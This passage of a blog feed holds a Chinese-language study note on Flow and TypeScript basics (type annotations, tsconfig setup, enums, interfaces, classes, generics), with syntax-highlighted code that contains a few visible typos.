错误就会保留在代码中</span><span class="token comment" spellcheck="true">// 又或者</span><span class="token keyword">function</span> sum <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">}</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">sun</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'100'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//100100</span><span class="token comment" spellcheck="true">// 还有对象键会自动转化成字符串</span>obj<span class="token punctuation">[</span><span class="token boolean">true</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span><span class="token string">'true'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h3 id="强类型的优势"><a href="#强类型的优势" class="headerlink" title="强类型的优势"></a>强类型的优势</h3><ol><li>错误更早暴露</li><li>代码更智能，编码更准确</li><li>重构更牢靠</li><li>减少不必要的类型判断</li></ol><h2 id="Flow：JS类型检查器"><a href="#Flow：JS类型检查器" class="headerlink" title="Flow：JS类型检查器"></a>Flow：JS类型检查器</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 类型注解</span><span class="token keyword">function</span> sum <span class="token punctuation">(</span>a<span class="token punctuation">:</span> number<span class="token punctuation">,</span> b<span class="token punctuation">:</span>number<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">}</span></code></pre><p>怎么使用？首先<code>yarn add flow-bin</code></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// @flow</span><span class="token keyword">function</span> sum <span class="token punctuation">(</span>a<span class="token punctuation">:</span> number<span class="token punctuation">,</span> b<span class="token punctuation">:</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">}</span><span class="token function">sum</span><span class="token punctuation">(</span><span class="token string">'100'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 命令行运行 yarn flow </span><span class="token comment" spellcheck="true">// 报错:Could not find a .flowconfig in . or any of its parent directories.</span><span class="token comment" spellcheck="true">// 运行yarn flow init</span><span class="token comment" spellcheck="true">// yarn flow stop 停止运行</span></code></pre><p>学会Flow在读源码时很方便</p><p>1）函数的类型注释</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> number<span class="token punctuation">,</span> y<span class="token punctuation">:</span> number<span class="token punctuation">)</span><span class="token punctuation">:</span> number <span class="token punctuation">{</span>  <span class="token keyword">return</span> x <span class="token operator">+</span> y      <span class="token comment" spellcheck="true">//x的类型是number,y的类型是number，函数的返回值类型是number</span><span class="token punctuation">}</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span></code></pre><p> 2）数组类型注释：Array<t>,T表示数组中每项的数据类型</t></p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> arr<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>number<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'Hello'</span><span class="token punctuation">)</span></code></pre><p>3）类类型注释</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">Bar</span> <span class="token punctuation">{</span>  x<span class="token punctuation">:</span> string<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// x 是字符串</span>  y<span class="token punctuation">:</span> string <span class="token operator">|</span> number<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// y 可以是字符串或者数字</span>  z<span class="token punctuation">:</span> boolean<span class="token punctuation">;</span>  <span class="token function">constructor</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> string<span class="token punctuation">,</span> y<span class="token punctuation">:</span> string <span class="token operator">|</span> number<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y    <span class="token keyword">this</span><span class="token punctuation">.</span>z <span class="token operator">=</span> <span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">var</span> bar<span class="token punctuation">:</span> Bar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span></code></pre><p>4）对象类型注释</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> obj<span class="token punctuation">:</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> string<span class="token punctuation">,</span> b<span class="token punctuation">:</span> number<span class="token punctuation">,</span> c<span class="token punctuation">:</span> Array<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">,</span> d<span class="token punctuation">:</span> Bar <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span>  a<span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>  b<span class="token punctuation">:</span> <span class="token number">11</span><span class="token punctuation">,</span>  c<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'world'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  d<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>5）如果想指定类型为null或者undefined，只需要写成?T形式</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> foo<span class="token punctuation">:</span> <span class="token operator">?</span>string <span class="token operator">=</span> <span class="token keyword">null</span>   <span class="token comment" spellcheck="true">//foo可以为字符串也可以为bull</span></code></pre><h2 id="TypeScript快速上手"><a href="#TypeScript快速上手" class="headerlink" title="TypeScript快速上手"></a>TypeScript快速上手</h2><p><code>yarn init</code>：初始化package.json</p><p><code>yarn add typescript --dev</code>：安装typescript</p><p>新建ts文件<code>demo.ts</code></p><p><code>yarn tsc demo.ts</code>：编译demo.ts</p><p>根目录下出现<code>demo.js</code>，已经自动转化为ES5</p><h3 id="TypeScript配置文件"><a href="#TypeScript配置文件" class="headerlink" title="TypeScript配置文件"></a>TypeScript配置文件</h3><p><code>yarn tsc --init</code>：生成<code>tsconfig.json</code></p><pre class=" language-json"><code class="language-json">   <span class="token property">"sourceMap"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                         // <span class="token property">"outFile"</span><span class="token operator">:</span> <span class="token string">"./"</span><span class="token punctuation">,</span>                          <span class="token property">"outDir"</span><span class="token operator">:</span> <span class="token string">"dist"</span><span class="token punctuation">,</span>                            <span class="token property">"rootDir"</span><span class="token operator">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span>  </code></pre><p>创建<code>src</code>文件夹放ts文件，运行<code>yarn tsc</code>编译整个项目</p><h2 id="TypeScript原始类型"><a href="#TypeScript原始类型" class="headerlink" title="TypeScript原始类型"></a>TypeScript原始类型</h2><pre class=" language-ts"><code class="language-ts"><span class="token keyword">const</span> a<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">=</span> <span class="token string">'a'</span><span class="token keyword">const</span> b<span class="token punctuation">:</span> <span class="token keyword">number</span> <span class="token operator">=</span> <span class="token number">100</span> <span class="token comment" spellcheck="true">// NaN Infinity</span><span class="token keyword">const</span> c<span class="token punctuation">:</span> <span class="token keyword">boolean</span> <span class="token operator">=</span> <span class="token keyword">true</span><span class="token comment" spellcheck="true">// 非严格模式下可以设置为空</span><span class="token keyword">const</span> d<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">const</span> e<span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token operator">=</span> undefined<span class="token keyword">const</span> f<span class="token punctuation">:</span> <span class="token keyword">null</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">const</span> g<span class="token punctuation">:</span> undefined <span class="token operator">=</span> undefined<span class="token keyword">const</span> h<span class="token punctuation">:</span> symbol <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 会报错，tsconfig.json中target设置成es2015就可以（引用的标准库）</span></code></pre><p>在写demo时，每个ts文件最后都加上一行<code>export {}</code>，使其成为模块作用域，保证变量名重复不报错</p><h2 id="Object类型，数组类型等"><a href="#Object类型，数组类型等" class="headerlink" title="Object类型，数组类型等"></a>Object类型，数组类型等</h2><pre class=" language-ts"><code class="language-ts"><span class="token keyword">const</span> foo<span class="token punctuation">:</span> object <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// [] // {}</span><span class="token comment" spellcheck="true">// object类型不止有对象，还有数组，函数</span><span class="token keyword">const</span> obj<span class="token punctuation">:</span> <span class="token punctuation">{</span> foo<span class="token punctuation">:</span> <span class="token keyword">number</span> <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token punctuation">{</span> foo<span class="token punctuation">:</span><span class="token number">123</span> <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// 对象</span><span class="token comment" spellcheck="true">// 数组类型</span><span class="token keyword">const</span> arr1<span class="token punctuation">:</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span><span class="token keyword">number</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">const</span> arr2<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">function</span> sum <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 就不用在这里判断是否数字了</span>    <span class="token keyword">return</span> args<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> current<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> pre <span class="token operator">+</span> current<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 元组类型:数量和类型确定</span><span class="token keyword">const</span> tuple<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">number</span><span class="token punctuation">,</span> <span class="token keyword">string</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">]</span>Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//得到的就是元组</span><span class="token comment" spellcheck="true">// 枚举类型</span><span class="token keyword">const</span> post <span class="token operator">=</span> <span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'aaaaa'</span>    content<span class="token punctuation">:</span> <span class="token string">'abbb'</span><span class="token punctuation">,</span>    status<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token comment" spellcheck="true">// 0,1,2 代表不同状态，如果忘了或者混进其他数字怎么办</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 加上const不会影响编译后的代码</span><span class="token keyword">const</span> <span class="token keyword">enum</span> PostStatus <span class="token punctuation">{</span>    Draft <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>    Unpublished <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span>    Published <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 令status = PostStatus.Draft</span><span class="token comment" spellcheck="true">// 函数类型</span><span class="token comment" spellcheck="true">// 函数声明</span><span class="token keyword">function</span> func1 <span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> b<span class="token operator">?</span><span class="token punctuation">:</span><span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'func1'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 函数表达式</span><span class="token keyword">const</span> func2<span class="token punctuation">:</span> <span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span><span class="token keyword">number</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">string</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token string">'func2'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 任意类型</span><span class="token keyword">function</span> stringify <span class="token punctuation">(</span>value<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token string">'str'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 轻易不要使用</span><span class="token comment" spellcheck="true">// 隐式类型推断</span><span class="token keyword">let</span> age <span class="token operator">=</span> <span class="token number">18</span> <span class="token comment" spellcheck="true">// number</span>age <span class="token operator">=</span> <span class="token string">'string'</span> <span class="token comment" spellcheck="true">// 保存</span><span class="token keyword">let</span> foo <span class="token comment" spellcheck="true">// 默认为any</span>foo <span class="token operator">=</span> '<span class="token keyword">string</span><span class="token comment" spellcheck="true">// 类型断言</span><span class="token keyword">const</span> nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">]</span><span class="token keyword">const</span> res <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">const</span> square <span class="token operator">=</span> res <span class="token operator">*</span> res <span class="token comment" spellcheck="true">// ts会报错，它认为res为number或undefined（可能找不到）</span><span class="token comment" spellcheck="true">// 如何断言</span><span class="token keyword">const</span> num1 <span class="token operator">=</span> res as <span class="token keyword">number</span><span class="token keyword">const</span> num2 <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token keyword">number</span><span class="token operator">></span>res <span class="token comment" spellcheck="true">// JSX 下不能使用</span></code></pre><h2 id="TypeScript接口与类"><a href="#TypeScript接口与类" class="headerlink" title="TypeScript接口与类"></a>TypeScript接口与类</h2><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// 接口</span><span class="token keyword">interface</span> <span class="token class-name">Post</span> <span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token keyword">string</span>    content<span class="token punctuation">:</span> <span class="token keyword">string</span>    subtitle<span class="token operator">?</span><span class="token punctuation">:</span> <span class="token keyword">string</span>        <span class="token comment" spellcheck="true">// 可选成员</span>    readonly summary<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token comment" spellcheck="true">// 只读成员</span><span class="token punctuation">}</span><span class="token keyword">function</span> printPost <span class="token punctuation">(</span>post<span class="token punctuation">:</span> Post<span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>title<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>post<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">printPost</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    title<span class="token punctuation">:</span> <span class="token string">'hello'</span><span class="token punctuation">,</span>    content<span class="token punctuation">:</span> <span class="token string">'a'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 动态成员</span><span class="token keyword">interface</span> <span class="token class-name">Cache</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>prop<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token comment" spellcheck="true">// 属性名为任意字符串</span><span class="token punctuation">}</span><span class="token keyword">const</span> cache<span class="token punctuation">:</span> Cache <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>cache<span class="token punctuation">.</span>foo <span class="token operator">=</span> <span class="token string">'value1'</span>cache<span class="token punctuation">.</span>bar <span class="token operator">=</span> <span class="token string">'value2'</span><span class="token comment" spellcheck="true">// 类</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> name<span class="token punctuation">:</span> <span class="token keyword">string</span>    <span class="token keyword">private</span> age<span class="token punctuation">:</span> <span class="token keyword">number</span>    <span class="token keyword">protected</span> readonly gender<span class="token punctuation">:</span> <span class="token keyword">boolean</span> <span class="token comment" spellcheck="true">// protected只允许子类访问   readonly只读属性</span>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age    <span class="token punctuation">}</span>    sayHi <span class="token punctuation">(</span>msg<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span>：<span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> msg<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span>name<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">,</span> age<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span>         console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>gender<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> tom <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'tom'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>gender<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 报错</span></code></pre><p>类去实现接口</p><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Eat</span> <span class="token punctuation">{</span>    eat（food<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">}</span><span class="token keyword">interface</span> <span class="token class-name">Run</span> <span class="token punctuation">{</span>    run（distance<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Eat</span><span class="token punctuation">,</span> Run <span class="token punctuation">{</span>    eat <span class="token punctuation">(</span>food<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`优雅地进餐：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>food<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    run <span class="token punctuation">(</span>distance<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`直立行走：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>distance<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token keyword">implements</span> <span class="token class-name">Eat</span><span class="token punctuation">,</span> Run <span class="token punctuation">{</span>    eat <span class="token punctuation">(</span>food<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`呼噜呼噜地吃：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>food<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    run <span class="token punctuation">(</span>distance<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`爬行：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>distance<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>抽象类：与接口的区别是可以包含具体的实现</p><pre class=" language-ts"><code class="language-ts">abstract <span class="token keyword">class</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 抽象类只能被继承</span>    eat <span class="token punctuation">(</span>food<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`呼噜呼噜地吃：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>food<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    abstract run <span class="token punctuation">(</span>distance<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token comment" spellcheck="true">// 抽象方法在子类中必须实现</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span> <span class="token punctuation">{</span>    run <span class="token punctuation">(</span>distance<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`爬行：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>distance<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> d <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span>d<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token string">'food'</span><span class="token punctuation">)</span>d<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span></code></pre><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>声明时不指定类型，调用时才指定</p><pre class=" language-ts"><code class="language-ts"><span class="token keyword">function</span> createNumberArray <span class="token punctuation">(</span>length<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span><span class="token keyword">number</span><span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">return</span> arr<span class="token punctuation">}</span><span class="token keyword">function</span> createStringArray <span class="token punctuation">(</span>length<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span><span class="token keyword">string</span><span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">return</span> arr<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 泛型解决冗余问题,在函数后面加&lt;T></span><span class="token keyword">function</span> createArray<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">(</span>length<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> value<span class="token punctuation">:</span> T<span class="token punctuation">)</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token keyword">Array</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>    <span class="token keyword">return</span> arr<span class="token punctuation">}</span><span class="token keyword">const</span> res <span class="token operator">=</span> createArray<span class="token operator">&lt;</span><span class="token keyword">string</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'foo'</span><span class="token punctuation">)</span></code></pre><p>类型声明：引入第三方模块时没有类型则需要声明</p><pre class=" language-ts"><code class="language-ts"><span class="token keyword">import</span> <span class="token punctuation">{</span> camelCase <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'lodash'</span><span class="token keyword">declare</span> <span class="token keyword">function</span> camelCase <span class="token punctuation">(</span>input<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token function">camelCase</span><span class="token punctuation">(</span><span class="token string">'hello typed'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 或者在npm模块中直接安装 类型声明</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数式编程</title>
      <link href="2020/08/18/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
      <url>2020/08/18/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
      
